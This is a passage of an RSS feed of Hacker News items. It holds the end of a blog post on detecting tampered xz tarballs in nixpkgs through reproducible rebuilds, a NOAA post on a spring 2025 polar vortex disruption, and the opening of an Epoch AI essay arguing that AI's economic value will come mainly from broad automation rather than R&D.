<p>As a proof of concept, and to gather the feedback of the community I opened <a href="https://github.com/NixOS/nixpkgs/pull/391569">a pull request</a> in the <code>nixpkgs</code> repository for the <code>xz</code> case, but if the method is adopted we should then implement it for the other candidate packages in <code>nixpkgs</code>’s bootstrap.</p>
<p><strong>Addendum 2: Evaluation: reproducibility of <code>stdenv</code> over time</strong></p>
<p>As discussed above, the method I propose assumes the packages we want to build trust in are <em>bitwise reproducible</em>. In order to help validate the approach, let’s verify that the packages belonging to the <code>stdenv</code> runtime are indeed reproducible.
To do that, I have (as part of a bigger research project whose findings are summarized in <a href="https://luj.fr/blog/is-nixos-truly-reproducible.html">another blog post</a>) sampled 17 <code>nixpkgs-unstable</code> revisions from 2017 to 2023 and rebuilt every <em>non-fixed-output-derivation</em> (FOD) composing <code>stdenv</code> from these revisions using the <code>nix-build --check</code> command to check for bitwise reproducibility.
Here are my findings:</p>
<ul>
<li>In every revision <code>xz</code> was bitwise reproducible ;</li>
<li>In 12 of the 17 revisions there was either one or two packages that were buildable but not reproducible, but those packages are consistent over time: for example <code>gcc</code> has consistently been non reproducible from 2017 to 2021 and <code>bash</code> until 2019.</li>
</ul>
<p>These findings, while showing that this method cannot be applied to <em>every</em> package in <code>stdenv</code>, are encouraging: even if some packages are not bitwise reproducible, they are consistently so, which means that it should be possible to selectively activate it on packages that exhibit good reproducibility in the long term.</p>
<p><strong>Addendum 3: Limitations: the trusting trust issue</strong></p>
<p>The trusting trust issue is a famous <a href="https://www.cs.cmu.edu/~rdriley/487/papers/Thompson_1984_ReflectionsonTrustingTrust.pdf">thought experiment initiated by Ken Thomson</a> during his Turing award acceptance lecture. The idea is the following: assume there is a backdoor in compilers we use to build our software such that the compiler propagates the backdoor to all new version of itself that it builds, but behaves normally for any other build until some point in time where it backdoors all executables it produces. Moderns compilers often need a previous version of themselves to be compiled so there must be an initial executable that we have to trust to build our software, making this kind of sophisticated attack <em>theoretically</em> possible and completely undetectable.
Similarly, the method I am proposing here requires to make the assumption that the untrusted <code>xz</code> (the one built during the bootstrap phase) can’t indirectly corrupt the build of <code>xz-after-bootstrap</code> to make it look like the produced artifacts are identical. Again, such an attack would probably be extremely complex to craft so the assumption here seems sane.</p></li>
</ol>
<h3 id="thanks">Thanks</h3>
<p>I would like to thank <a href="https://www.theozimmermann.net/">Théo Zimmermann</a>, <a href="https://orcid.org/0009-0008-7972-7160">Pol Dellaiera</a>, <a href="https://groundry.org/">Martin Schwaighofer</a>, and <a href="https://upsilon.cc/~zack/">Stefano Zacchiroli</a> for their valuable feedback and insightful discussions during the writing of this blog post. Their contributions significantly helped me organize and refine my ideas on this topic.</p>
<section id="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn1"><p><em>Jia Tan</em> essentially (through multiple identities) pressured the main <code>xz</code> maintainer into accepting new maintainers for the project, claiming that the project was receiving sub-par maintenance.<a href="#fnref1" role="doc-backlink">↩︎</a></p></li>
<li id="fn2"><p>Fortunately, even though the malicious version was available to users, the backdoor was not active on NixOS has it was specifically made to target Debian and Fedora systems.<a href="#fnref2" role="doc-backlink">↩︎</a></p></li>
<li id="fn3"><p>Tested at the time of writing on revision <code>1426c51</code><a href="#fnref3" role="doc-backlink">↩︎</a></p></li>
<li id="fn4"><p>For obvious reasons, the backdoored tarball has been deleted from GitHub and the project’s website but it is still available in the NixOS cache!<a href="#fnref4" role="doc-backlink">↩︎</a></p></li>
<li id="fn5"><p>This illustrates the power and limitation of this method: it only detects modifications of the tarball that have an impact on the final result. In the case of the <code>xz</code> backdoor, NixOS executables did not contain the backdoor and as such without any modification we would not have discovered the backdoor. So yes, the title is a little bit catchy, but illustrates the idea.<a href="#fnref5" role="doc-backlink">↩︎</a></p></li>
</ol>
</section>
        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The polar vortex is hitting the brakes (224 pts)]]></title>
            <link>https://www.climate.gov/news-features/blogs/polar-vortex/polar-vortex-hitting-brakes</link>
            <guid>43448023</guid>
            <pubDate>Sat, 22 Mar 2025 19:31:38 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.climate.gov/news-features/blogs/polar-vortex/polar-vortex-hitting-brakes">https://www.climate.gov/news-features/blogs/polar-vortex/polar-vortex-hitting-brakes</a>, See on <a href="https://news.ycombinator.com/item?id=43448023">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><span>For much of this winter season, the polar vortex winds at 60°N have been racing around the stratospheric polar region. During February alone, these west-to-east winds were two times stronger than normal for that time of year. However, the latest forecasts suggest that the polar vortex is about to switch gears with a major vortex disruption to happen this weekend. Read on to find out why the polar vortex could be bottoming out early this season.</span></p>
<figure><p><a href="https://www.climate.gov/media/16835"><img loading="lazy" src="https://www.climate.gov/sites/default/files/styles/full_width_620_original_image/public/2025-03/observed-forecasted-winds-2025-03-06_0.png?itok=yUooMOq2" width="620" height="359" alt="time series of stratospheric winds"></a></p>
      
            <p>Observed and forecasted (NOAA GEFSv12) polar vortex wind speeds at 60°N (bold blue line) compared to the natural range of variability (faint blue shading). Since mid-November, these stratospheric winds have been stronger than normal (thin blue line). However, that’s about to change as the latest forecasts (issued March 3, 2025) indicate the winds at 60°N are going to dramatically decrease over the next few days (bold purple line), indicating a polar vortex disruption. The big question is whether these winds will rebound toward their normal strength before the end of the season. NOAA Climate.gov image, adapted from original by Laura Ciasto.</p>
      
      </figure><h2><strong>Stratospheric pit stop</strong></h2>
<p><span><span>At the time of writing this post, the polar stratospheric west-to-east winds are still speeding around the Arctic [footnote #1], but forecasts suggest they are not only going to come to a screeching halt by the weekend, but they are then going to strongly reverse direction. When this wind reversal (i.e., winds become east-to-west) occurs at 60°N and 10 hPa (~19 mi/30 km above us), it’s called </span><a href="https://www.climate.gov/news-features/blogs/polar-vortex/cooking-stratospheric-polar-vortex-disruption"><span>a sudden stratospheric warming</span></a><span>. As the name suggests, these major polar vortex disruptions are linked to incredible stratospheric temperature increases over a short period of time [footnote #2]. For this upcoming event, temperatures in the mid-stratosphere could increase as much as 45°F (25°C) in less than 5 days. </span></span></p>
<figure><p><a href="https://www.climate.gov/media/16836"><img loading="lazy" src="https://www.climate.gov/sites/default/files/styles/full_width_620_original_image/public/2025-03/observed-forecasted-polar-cap-temperatures-2025-03-06.png?itok=evp_E-Sz" width="620" height="361" alt="time series of stratospheric temperatures"></a></p>
      
            <p>Observed and forecasted (NOAA GEFSv12) polar cap temperatures compared to the natural range of variability (faint orange shading). Since October, these stratospheric temperatures (bold red line) have been colder than normal (thin red line). This is expected because strong polar vortex winds act as a barrier between cold Arctic air and warmer mid-latitude air. As the polar vortex becomes disrupted, the stratosphere will warm quickly and intensely (bold pink line), hence the name sudden stratospheric warming. NOAA Climate.gov image, adapted from original by Laura Ciasto.</p>
      
      </figure><p><span><span>Sudden stratospheric warming events usually come in two possible flavors in which the polar vortex either displaces off the pole or splits into two smaller vortexes. This particular event may be a bit of both. The initial warming event kicks off with the polar vortex shifted toward Europe, but the forecasts also show pieces of the vortex splitting off from the main lobes several days later.</span></span></p>
<figure><p><a href="https://www.climate.gov/media/16838" hreflang="en"><img loading="lazy" src="https://www.climate.gov/sites/default/files/styles/full_width_stretch_featured_image/public/2025-03/polar-vortex-temperature-winds-forecast-observed-2025-03-06--corrected-01.png?itok=9p9Vfm9d" width="1100" height="720" alt="maps of temperature and winds over Northern Hemisphere"></a>
</p>

            <p>Evolution and forecast of stratospheric conditions. Earlier this week (March 4 2025; left panel), the polar vortex winds (vectors) were situated closer to the pole keeping the relatively cold air (light shading) isolated from the warmer surrounding air (orange/red shading). By March 10, 2025 (middle panel), the GFS forecast indicates the polar vortex will be nudged farther off the pole, with warmer air flooding the Arctic. The average winds around 60°N will become east-to-west, characterizing a <em>sudden stratospheric warming</em>. This disruption to the polar vortex is expected to continue through at least the next two weeks with smaller lobes of the vortex periodically splitting off (e.g., March 13, 2025, right panel). Current forecasts suggest that the stratospheric winds will not recover this spring and become west-to-east again. If so, this event will be classified as a <em>final warming</em> instead of a mid-winter <em>sudden stratospheric warming</em>. NOAA Climate.gov image, based on Global Forecast System data provided by Laura Ciasto.</p>
      
      </figure><h2><strong>Will the polar vortex rev its engine again?</strong></h2>
<p><span>One of the big questions regarding this polar vortex disruption is whether the stratospheric winds at 60°N will recover and become west-to-east again, extending the polar vortex season (and its ability to influence weather patterns) into late spring. Forecasts [footnote #3] do not currently show a recovery, so this pit stop may be the end of the vortex’s racing season. If this turns out to be the case, then it would be classified as a “final stratospheric warming” rather than a major sudden stratospheric warming.</span></p>
<p><span><span><span>As we discussed in last season’s </span><a href="https://www.climate.gov/news-features/blogs/polar-vortex/last-hurrah-polar-vortex"><span>post</span></a><span>, final warmings occur every spring as sunlight returns to the North Pole and the temperature differences between the equator and pole decrease. As a result, the west-to-east winds that are maintained by that temperature difference decrease and transition to east-to-west winds. This transition usually happens sometime in mid-April, but there have been 5 years since 1958 when final warmings occurred before March 15.&nbsp; Like this year, those years corresponded to winters without a mid-winter sudden stratospheric warming [footnote #4].</span></span></span></p>
<h2><strong>A potential stratosphere-troposphere fender bender </strong></h2>
<figure><p><a href="https://www.climate.gov/media/16837"><img loading="lazy" src="https://www.climate.gov/sites/default/files/styles/full_width_620_original_image/public/2025-03/polar-vortex-geopotential-height-2025-03-06.png?itok=IoXKmOrY" width="620" height="307" alt="contour plot of atmospheric thickness anomalies over polar cap"></a></p>
      
            <p>Differences from average atmospheric thickness (“standardized geopotential height anomalies”) in the column of air over the Arctic for the stratosphere and troposphere. Since the beginning of the year, low-thickness anomalies (purple shading indicative of a stronger than average polar vortex) have dominated the stratosphere but only periodically coupled down to the troposphere. Latest forecasts show a dramatic change with thickness anomalies increasing (orange shading), consistent with a polar vortex disruption. These stratospheric anomalies are preceded by tropospheric anomalies of the same sign, hinting at a nudge from below. However, it’s too soon to tell whether these stratospheric anomalies will then drip down into the troposphere again. Standardized anomalies are based on departures from the 1991-2020 Climate Forecast System Reanalysis climatologies and have been divided by the standard deviation. Data are from the Global Forecast System observational analysis and forecast.</p>
      
      </figure><p><span>Regardless of whether this is the final warming or the vortex decides to ride again, both have the potential to impact our weather this spring. Disruptions to the polar vortex can communicate down to the troposphere and disrupt the jet stream. These disruptions to the jet stream can bring colder than normal Arctic air down into the eastern United States.&nbsp;</span></p>
<p><span>Now this doesn’t mean you need to bring your winter tires back out while your garden tools continue to collect dust. First, it’s too soon to tell whether this vortex disruption will make its way down to the troposphere as the latest forecast doesn’t show much stratosphere-troposphere interaction after the onset of the warming event. Second, though the impacts of March sudden warmings are very similar to those in mid-winter, spring is coming, so any Arctic air brought down in the US won't "feel" as cold compared to if it happened in January because we are in a warmer part of the year. </span></p>
<p><span>Even if the polar vortex season ends early this year, we’re hoping to have at least 1 or 2 more posts (including a guest author) so stay tuned!</span></p>
<h2><strong>Footnotes</strong></h2>
<p><span>[1] We spent several posts this winter talking about the strong, but sometimes stretchy, polar vortex and what that has meant for our winter weather. If you’re interested, please read more </span><a href="https://www.climate.gov/news-features/blogs/polar-vortex/polar-vortex-causing-us-cold-air-outbreak"><span>here</span></a><span>, </span><a href="https://www.climate.gov/news-features/blogs/polar-vortex/another-blast-arctic-air-time-stretched-strong-polar-vortex"><span>here</span></a><span>, and </span><a href="https://www.climate.gov/news-features/blogs/polar-vortex/polar-vortex-intensifications-overlooked-influencer"><span>here</span></a><span>. </span></p>
<p><span>[2] The sudden increase in temperature over such a short period of time occurs for a couple of reasons.&nbsp; As the polar winds weaken and reverse direction during a major sudden stratospheric warming, there is a component of the air that moves poleward and descends rapidly over the Arctic and pressure increases. As the air descends it warms: this is one of the reasons why the temperatures can increase so impressively during a major warming event. Furthermore, the polar vortex winds act as a barrier between cold Arctic air and warmer mid-latitude air. When the winds/barrier weaken, warmer mid-latitude winds can enter the polar stratosphere and contribute to increasing temperatures.</span></p>
<p><span>[3] We show the American GEFS model in these posts, but the ECMWF model currently doesn’t show a vortex recovery in the next several weeks either.</span></p>
<p><span>[4] The link between winters with a sudden warming and late season final warmings (and correspondingly, years without a sudden warming and early season final warmings) is thought to be due to the tug of war in the stratosphere between dynamic and radiative processes that control the strength of the polar vortex. In particular, if a sudden warming occurs during mid-winter, the polar stratospheric winds will be pulled towards returning to a west-to-east flowing state to balance the stratospheric temperature gradient created by lack of sunlight over the pole. If this recovery of the stratospheric winds to west-to-east flow occurs, it provides potentially weeks to months of additional time for planetary waves to interact with the winds, extending the timing of the final warming until much later. On the other hand, if the sudden warming occurs near the spring equinox, when sunlight has returned to the pole, the stratospheric winds feel no radiative force to return to a west-to-east state, and so often the winds will stay east-to-west (corresponding to an early season final warming).&nbsp;</span></p>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Most AI value will come from broad automation, not from R & D (131 pts)]]></title>
            <link>https://epoch.ai/gradient-updates/most-ai-value-will-come-from-broad-automation-not-from-r-d</link>
            <guid>43447616</guid>
            <pubDate>Sat, 22 Mar 2025 18:35:00 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://epoch.ai/gradient-updates/most-ai-value-will-come-from-broad-automation-not-from-r-d">https://epoch.ai/gradient-updates/most-ai-value-will-come-from-broad-automation-not-from-r-d</a>, See on <a href="https://news.ycombinator.com/item?id=43447616">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
          

<p>A popular view about the future impact of AI on the economy is that it will be primarily mediated through AI automation of R&amp;D. In some form or another, this view has been expressed by many influential figures in the industry:</p>

<ul>
  <li>
    <p>In his essay <a href="https://darioamodei.com/machines-of-loving-grace">“Machines of Loving Grace”</a>, Dario Amodei lists five ways in which AI can benefit humanity in a scenario where AI goes well. He considers biology R&amp;D, neuroscience R&amp;D, and economics R&amp;D as three of these ways. There’s no point at which he clearly argues that AI will lead to high rates of economic growth due to being broadly deployed throughout the economy as opposed to speeding up R&amp;D and perhaps improving economic governance.</p>
  </li>
  <li>
    <p>Demis Hassabis, CEO of DeepMind, is also bullish on R&amp;D as the main channel through which AI will benefit society. <a href="https://www.thetimes.com/life-style/celebrity/article/demis-hassabis-ai-could-cure-all-diseases-in-10-years-09pcqh7cb">In a recent interview</a>, he provides specific mechanisms through which this could happen: AI could cure all diseases and “solve energy”. He mentions “radical abundance” as a possibility as well, but beyond the R&amp;D channel doesn’t name any other way in which this could come about.</p>
  </li>
  <li>
    <p>In his essay <a href="https://blog.samaltman.com/three-observations">“Three Observations”</a>, Sam Altman takes a more moderate position and explicitly says that in some ways AI might end up like the transistor, a big discovery that scales well and seeps into every corner of the economy. However, even he singles out the impact of AI on scientific progress as likely to “surpass everything else”.</p>
  </li>
</ul>

<p>Overall, this view is surprisingly influential despite not having been supported by any rigorous economic arguments. We’ll argue in this issue that it’s also very likely wrong.</p>

<p>R&amp;D is generally not as economically valuable as people assume – increasing productivity and new technologies are certainly essential for long-run growth, but the contribution of explicit R&amp;D to these processes is smaller than people generally think. Moreover, even most of this contribution is external and not captured in profits by the company performing the R&amp;D, reducing the incentive to deploy systems to perform R&amp;D in the first place. This combination means most AI systems will actually be deployed and earn revenue from tasks that are unrelated to R&amp;D, and in aggregate these tasks will be more economically valuable as well.</p>

<p>It’s also significantly harder to automate R&amp;D jobs than it might naively seem, because most tasks in the job of a researcher are not “reasoning tasks” and depend crucially on capabilities such as agency, multimodality, and long-context coherence. Once AI capabilities are already at a point where the job of a researcher can be entirely automated, it will also be feasible to automate most other jobs in the economy, which for the above reason would most likely create much more economic value than narrowly automating R&amp;D alone.</p>

<p>When we combine these two points, there’s no reason to expect most of the economic value of AI to come from R&amp;D at any point in the future. A much more plausible scenario is that the value of AI will be driven by broad economic deployment, and while we should expect this to <a href="https://epoch.ai/blog/explosive-growth-from-ai-a-review-of-the-arguments">lead to an increase in productivity and output per person</a> due to increasing returns to scale, most of this increase will probably not come from explicit R&amp;D.</p>



<h2 id="the-primary-economic-impact-of-ai-will-be-its-ability-to-broadly-automate-labor">The primary economic impact of AI will be its ability to <em>broadly</em> automate labor</h2>

<p>There are two related but subtly different claims that we want to tease apart in this section, one we agree with and another we disagree with:</p>

<ul>
  <li>
    <p><strong>A technology that could automate R&amp;D entirely, and was only used for this purpose, would be highly valuable and would likely add at least a few percentage points to economic growth per year.</strong> We think this claim is true and it’s hard to argue against it.</p>
  </li>
  <li>
    <p><strong>In the real world, the most socially or economically valuable application of such a technology would in fact be to automate R&amp;D.</strong> This is the claim we will be disputing. While R&amp;D is valuable, we don’t think it’s where we should expect most of the economic value or growth benefits from AI, both before and after AIs exceed human performance on all relevant tasks.</p>
  </li>
</ul>

<p>To understand our argument disputing the second claim, we must first measure the actual economic value of R&amp;D. We know that R&amp;D gets its economic value primarily through improving productivity, so to quantify the impact of R&amp;D we might ask how much of the growth in labor productivity in the past has been due to R&amp;D spending and its associated spillovers. The US Bureau of Labor Statistics <a href="https://www.bls.gov/productivity/highlights/research-and-development-contribution-to-total-factor-productivity.htm">estimates that</a> R&amp;D financed by private firms only accounted for around 0.2%/yr of total factor productivity (TFP) growth in the US from 1988 to 2022, compared to around 0.8%/yr of total TFP growth over the same period and around 1.9%/yr of labor productivity growth.</p>

<p>Though <a href="https://fred.stlouisfed.org/series/Y057RC1Q027SBEA">public R&amp;D spending</a> is only around a quarter of <a href="https://fred.stlouisfed.org/series/Y694RC1Q027SBEA">total R&amp;D spending</a> in the US economy, we might also expect it to have larger positive externalities, and <a href="https://andrewjfieldhouse.com/wp-content/uploads/2023/05/Fieldhouse-and-Mertens-2023_5_5_23.pdf">Fieldhouse and Mertens (2023)</a> estimate that these two effects roughly cancel: public R&amp;D is also responsible for a quarter of TFP growth on average in the US, putting the total contribution of R&amp;D to US TFP growth at around 0.4%/yr or half of the total. Still, this means that only 20% of labor productivity growth in the US since 1988 has been driven by R&amp;D spending!</p>

<p>Capital deepening accounts for around half of labor productivity growth in this period, and of the remaining part, much of it is explained by other sources of productivity such as better management, learning-by-doing, knowledge diffusion, et cetera. What’s left over for R&amp;D to explain is a smaller contribution relative to the size of the overall “growth pie”, and even much of this R&amp;D might require other inputs than researchers, e.g. technical equipment and laboratory facilities.</p>

<figure>
  <img src="https://epoch.ai/assets/images/gradient-updates/2025/most-ai-value-will-come-from-broad-automation-not-from-r-d/figure-1.png">
</figure>

<p>Our estimate for the contribution of private R&amp;D to TFP growth also roughly match how the the economy actually allocates investment to R&amp;D versus capital accumulation, at least if we assume that many of the other factors driving TFP growth are difficult to invest in directly and both R&amp;D and capital formation face equally steep diminishing returns at any given time. Since capital deepening accounts for 50% of productivity growth while private R&amp;D accounts for 10%, we might expect capital investments to roughly be five times R&amp;D investments, and this intuition turns out to be correct: the US spends around $5T/yr on capital investment and $1T/yr on private R&amp;D in total.</p>

<p>So if R&amp;D is comparatively small potatoes, where should we actually deploy our AI systems in order to speed up growth? The most obvious channel is to broadly automate human labor, as the labor elasticity of output is around 0.6 in the US economy, which probably exceeds the “R&amp;D elasticity of output” by around five times. Moreover, we spend about 20 times more on labor applied broadly than on labor applied to explicit R&amp;D. The intuition for this is simple: if you want to produce the most economic value, you should automate whatever is being paid the most money in the current economy, and that makes labor an obvious target to focus on. The vastly larger economy that would result could reinvest its output into capital and accelerate TFP growth through many other channels than formal R&amp;D, e.g. through learning-by-doing. In aggregate, we have good reason to believe this gives rise to increasing returns to scale and thus accelerating economic growth, <a href="https://arxiv.org/abs/2309.11690">perhaps up to levels ten times faster than today or higher</a>.</p>

<p>The counterargument to this view is that the growth effects of R&amp;D are underestimated in the data and the low amount of spending on R&amp;D relative to capital investment is caused by some combination of large positive externalities and stronger stepping-on-toes effects in R&amp;D. These arguments are not <em>a priori</em> implausible, but quantitatively it seems hard to argue R&amp;D should explain a majority of TFP growth by itself when TFP varies across space and time for so many other reasons that seem significant. In addition, even if we follow influential papers such as <a href="https://www.aeaweb.org/articles?id=10.1257/aer.20180338">Bloom et al. (2020)</a> in making an unsupported assumption that TFP growth is completely driven by R&amp;D inputs, their parameter estimates imply an R&amp;D spending elasticity of output that’s around 0.3, about equal to capital and only half of labor.</p>

<p>To summarize, the vast majority of economic growth currently doesn’t come from R&amp;D, and we need a compelling reason to be convinced that AI will reverse this pattern. There are two reasons that are often brought up: that R&amp;D is specifically important for AI due to the possibility of AI systems automating their own R&amp;D, and that R&amp;D tasks in general will be easier for AI and thus will get automated significantly earlier than the rest of the economy. We think both of these reasons are unconvincing and explain why in the subsequent sections.</p>

<h2 id="automating-ai-rd-alone-likely-wont-dramatically-accelerate-ai-progress">Automating AI R&amp;D <em>alone</em> likely won’t dramatically accelerate AI progress</h2>

<p>Though the broader economic value of R&amp;D is not as large as we might have expected, there’s still a reason specific to AI to believe R&amp;D automation could be a dominant effect. If AI systems were able to automate the process of their own software R&amp;D, a <em>software-only singularity</em> might become possible: on a fixed stock of compute, we could run AI researchers who search for ways to improve their own algorithms, which would allow us to run even more virtual researchers to make yet more software progress, et cetera.</p>

<p>The plausibility of this feedback loop depends crucially on how fast “ideas get harder to find” as we make progress towards greater software efficiency. <a href="https://epoch.ai/blog/do-the-returns-to-software-rnd-point-towards-a-singularity">In prior work</a>, we’ve quantitatively estimated the size of this effect across several software domains and concluded that <em>if researcher effort is the only input to R&amp;D</em>, then a software-only singularity might be about as likely as not. However, the key assumption that many orders of magnitude of software R&amp;D progress can be made with researcher effort alone is load-bearing and most likely incorrect.</p>

<p>A more plausible model is one in which research progress requires both cognitive effort and data, with some degree of complementarity between the two inputs. This is also supported by the fact that across various software domains, AI is the one that has seen both the fastest experimental compute scaling and the fastest rate of software progress, with both of them currently being <a href="https://epoch.ai/trends">around 3-4x per year</a>. This coincidence suggests that using experimental compute to generate data is at least important for software progress, though we can’t tell on this basis alone to what extent it’s a complementary input to researcher effort.</p>

<p>If the two inputs are indeed complementary, any software-driven acceleration could only last until we become bottlenecked on compute and end up having to do the <em>physical work</em> of obtaining more GPUs in order to run more experiments. AI could of course speed this process up also, but only if it were to be widely deployed throughout the semiconductor supply chain, and probably even more broadly in the economy to supply this industry with the inputs it needs from elsewhere.</p>

<p>How many orders of magnitude a software-only singularity can last before bottlenecks kick in to stop it depends crucially on the strength of the complementarity between experiments and insight in AI R&amp;D, and unfortunately there’s no good estimate of this key parameter that we know about. However, in other parts of the economy it’s common to have nontrivial complementarities, and this should inform our assessment of what is likely to be true in the case of AI R&amp;D. Just as one example, <a href="https://www.nber.org/papers/w20452">Oberfield and Raval (2014)</a> estimate that the elasticity of substitution between labor and capital in the US manufacturing sector is 0.7, and this is already strong enough for any “software-only singularity” to fizzle out after less than an order of magnitude of improvement in efficiency.</p>

<p>Another piece of evidence in favor of bottlenecks in the R&amp;D process is that we’ve automated significant parts of R&amp;D already without observing any dramatic acceleration in scientific progress. For instance, we’ve continuously automated the programming work required for most R&amp;D, first by the development of specialized libraries and recently by the use of LLM-powered tools to accelerate coding; and over time we’ve also invented many kinds of physical labor-saving research equipment. However, none of this has given rise to an explosion of R&amp;D progress: the benefits were instead rather marginal, which is consistent with a story in which R&amp;D tasks have reasonably strong complementarity with one another. This doesn’t directly inform us about the complementarity between R&amp;D effort as a whole and experiments, but it’s another piece of evidence that should be factored into our prior.</p>

<p>The low quality of all this evidence means we can’t rule out that AI R&amp;D might be an unusual part of the economy in which the elasticity of substitution between key inputs is equal to or greater than 1, which would ensure complementarities are weak enough for a singularity to be possible in principle. However, comparison with other cases where we do have data should lead us to be cautious about any such prediction. By default, a software-only or software-biased singularity should be treated as an unlikely outcome rather than a likely one.</p>

<h2 id="fully-automating-rd-requires-a-very-broad-set-of-abilities">Fully automating R&amp;D requires a very broad set of abilities</h2>

<p>At first glance, the job of a scientist might seem like it leans very heavily on abstract reasoning—generating ideas, formulating hypotheses, analyzing data, coding, and mathematical reasoning. If this were true, it would suggest that scientific researchers will be among the jobs most at risk of being taken over by reasoning models in the near future. That’s because these are exactly the types of tasks that seem most amenable to automation using current reasoning models.</p>

<p>In such a world, AIs would greatly accelerate R&amp;D before AIs are broadly deployed across the economy to take over more common jobs, such as retail workers, real estate agents, or IT professionals. In short, AIs would “first automate science, then automate everything else.”</p>

<p>But this picture is likely wrong. In reality, most R&amp;D jobs require much more than abstract reasoning skills. To illustrate, consider medical scientists. Below is a list of <a href="https://www.onetonline.org/link/summary/19-1042.00">job tasks associated with medical scientists</a>, taken from the O*NET occupational survey, ranked by importance to the occupation. We have labeled each task based on whether we generally think it can be performed using only abstract reasoning skills—which in this context, means it requires purely linguistic, logical, or mathematical abilities, including writing reports, coding, or proving theorems.</p>

<table>
<thead>
    <tr>
        <th>Importance</th>
        <th>Task</th>
        <th>Automatable via abstract reasoning?</th>
    </tr>
</thead>
<tbody>
    <tr>
        <td>92</td>
        <td>Follow strict safety procedures when handling toxic materials to avoid contamination.</td>
        <td>❌ No</td>
    </tr>
    <tr>
        <td>91</td>
        <td>Evaluate effects of drugs, gases, pesticides, parasites, and microorganisms at various levels.</td>
        <td>❌ No</td>
    </tr>
    <tr>
        <td>87</td>
        <td>Plan and direct studies to investigate human or animal disease, preventive methods, and treatments for disease.</td>
        <td>❌ No</td>
    </tr>
    <tr>
        <td>87</td>
        <td>Prepare and analyze organ, tissue, and cell samples to identify toxicity, bacteria, microorganisms, or study cell structure.</td>
        <td>❌ No</td>
    </tr>
    <tr>
        <td>82</td>
        <td>Standardize drug dosages, methods of immunization, and procedures for manufacturing drugs and medicinal compounds.</td>
        <td>✅ Yes</td>
    </tr>
    <tr>
        <td>78</td>
        <td>Conduct research to develop methodologies, instrumentation, and procedures for medical applications, analyzing data and presenting findings.</td>
        <td>❌ No</td>
    </tr>
    <tr>
        <td>78</td>
        <td>Teach principles of medicine and medical and laboratory procedures to physicians, residents, students, and technicians.</td>
        <td>✅ Yes</td>
    </tr>
    <tr>
        <td>77</td>
        <td>Study animal and human health and physiological processes.</td>
        <td>❌ No</td>
    </tr>
    <tr>
        <td>75</td>
        <td>Write and publish articles in scientific journals.</td>
        <td>✅ Yes</td>
    </tr>
    <tr>
        <td>75</td>
        <td>Write applications for research grants.</td>
        <td>✅ Yes</td>
    </tr>
    <tr>
        <td>73</td>
        <td>Investigate the cause, progress, life cycle, or mode of transmission of diseases or parasites.</td>
        <td>❌ No</td>
    </tr>
    <tr>
        <td>70</td>
        <td>Use equipment such as atomic absorption spectrometers, electron microscopes, flow cytometers, or chromatography systems.</td>
        <td>❌ No</td>
    </tr>
    <tr>
        <td>67</td>
        <td>Confer with health departments, industry personnel, physicians, and others to develop health safety standards and public health improvement programs.</td>
        <td>✅ Yes</td>
    </tr>
    <tr>
        <td>60</td>
        <td>Consult with and advise physicians, educators, researchers, and others regarding medical applications of physics, biology, and chemistry.</td>
        <td>✅ Yes</td>
    </tr>
</tbody>
</table>



<p>Out of these 14 tasks, we guessed that only 6 require abstract reasoning alone to perform. Strikingly, we classified only one of the top five most important tasks for medical scientists as relying solely on abstract reasoning. Overall, the most critical aspects of the job appear to require hands-on technical skills, sophisticated coordination with others, specialized equipment use, long-context abilities, and complex multimodal understanding.</p>

<p>This pattern holds true across other common research occupations too. To demonstrate this, we used GPT-4.5 to label tasks across 12 common R&amp;D occupations into one of three categories, depending on whether it thinks the task can be performed using only abstract reasoning skills, whether it requires complex computer-use skills (but not physical presence), or whether it one needs to be physically present to complete the task. See <a href="https://chatgpt.com/share/67dcac5b-a5f8-8000-b3b1-56319af6eba1">this link</a> to our conversation with GPT-4.5 to find our methodology and results.</p>

<figure>
  <img src="https://epoch.ai/assets/images/gradient-updates/2025/most-ai-value-will-come-from-broad-automation-not-from-r-d/figure-2.png">

</figure>

<p>This plot reveals a more nuanced picture of what scientific research actually entails. Contrary to the assumption that research is largely an abstract reasoning task, the reality is that much of it involves physical manipulation and advanced agency. To fully automate R&amp;D, AI systems likely require the ability to autonomously operate computer GUIs, coordinate effectively with human teams, possess strong executive functioning skills to complete highly complex projects over long time horizons, and manipulate their physical environment to conduct experiments.</p>

<p>Yet, by the time AI reaches the level required to fully perform this diverse array of skills at a high level of capability, it is likely that a broad swath of more routine jobs will have <em>already</em> been automated. This contradicts the notion that AI will “first automate science, then automate everything else.” Instead, <strong>a more plausible prediction is that AI automation will first automate a large share of the general workforce, across a very wide range of industries, <em>before</em> it reaches the level needed to fully take over R&amp;D.</strong></p>

<p>Rather than expecting an AI revolution that starts with scientific breakthroughs and then later makes its way to other fields, we should anticipate an initial period where automation takes over a large fraction of conventional jobs first, with a large acceleration in science and technology following only once AI has mastered the messy and complex demands of real-world work.</p>

<p>Even after AI fully takes over R&amp;D, it is reasonable to expect AI will mainly accelerate science and technology through the large-scale automation of non-R&amp;D tasks, rather than by substituting for R&amp;D researchers directly. This expectation makes sense considering that explicit R&amp;D presently accounts for only a small portion of overall economic growth, as mentioned previously.</p>

<h2 id="ai-takeoff-will-likely-be-diffuse-and-salient">AI takeoff will likely be diffuse and salient</h2>

<p>Taken together, the preceding arguments suggest that even <em>before</em> AI begins to have transformative economic or technological effects, its impacts will likely be much more diffuse and salient than many stories of AI takeoff have depicted. By <em>diffuse</em> we mean that AI-driven automation will occur widely and transform a large share of the economy, rather than being largely narrowly confined to R&amp;D occupations. And by <em>salient</em> we mean that its impacts will be highly visible to most people and highly disruptive—for example, by displacing labor on a large scale.</p>

<p>Moreover, even <em>after</em> AI begins to have transformative effects on the world, the preceding arguments suggest that automation of explicit R&amp;D will only play a minor role contributing to these impacts. Instead, these effects will primarily be supported by broader automation throughout the economy.</p>

<p>Rather than imagining that the upcoming years of AI takeoff will take the form of a “country of geniuses in a data center” doing R&amp;D work, we think it’s better to imagine the following alternative picture:</p>

<ol>
  <li>AI progress will continue to incrementally expand the set of tasks AIs are capable of performing over the coming years. This progress will mainly be enabled by scaling compute infrastructure, rather than purely cognitive AI R&amp;D efforts.</li>
